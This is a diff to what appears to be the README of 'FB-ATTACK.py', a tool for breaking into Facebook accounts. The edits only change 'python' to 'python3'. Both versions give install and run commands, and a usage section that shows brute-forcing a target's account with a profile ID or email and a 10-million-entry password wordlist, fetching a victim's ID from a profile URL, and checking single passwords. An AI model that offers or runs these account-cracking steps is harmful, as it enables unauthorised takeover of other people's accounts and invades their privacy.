@@ -22,7 +22,7 @@ pkg install git -y
 ```
 
 ```shell script
-pkg install python -y
+pkg install python3 -y
 ```
 
 ```shell script
@@ -42,7 +42,7 @@ cd IFB
 ```
 
 ```shell script
-python FB-ATTACK.py
+python3 FB-ATTACK.py
 ```
 ***
 
@@ -74,20 +74,20 @@ cd IFB
 ```
 
 ```shell script
-python FB-ATTACK.py
+python3 FB-ATTACK.py
 ```
 ## Usage
    ```
-          Usage: python FB-ATTACK.py -t "target_id" -w "wordlist_location"
+          Usage: python3 FB-ATTACK.py -t "target_id" -w "wordlist_location"
 Examples:
      |-------->
-     | python FB-ATTACK.py -g https://facebook.com/target_profile_url_for_get_id
+     | python3 FB-ATTACK.py -g https://facebook.com/target_profile_url_for_get_id
      |-------->
-     | python FB-ATTACK.py -t 100001013078780 -w 10MPASS.txt
+     | python3 FB-ATTACK.py -t 100001013078780 -w 10MPASS.txt
      |-------->
-     | python FB-ATTACK.py -t target@gmail.com -w 10MPASS.txt
+     | python3 FB-ATTACK.py -t target@gmail.com -w 10MPASS.txt
      |-------->
-     |python FB-ATTACK.py -t target@gmail.com -s checkpassword
+     |python3 FB-ATTACK.py -t target@gmail.com -s checkpassword
      |-------->
 ```
 ## License
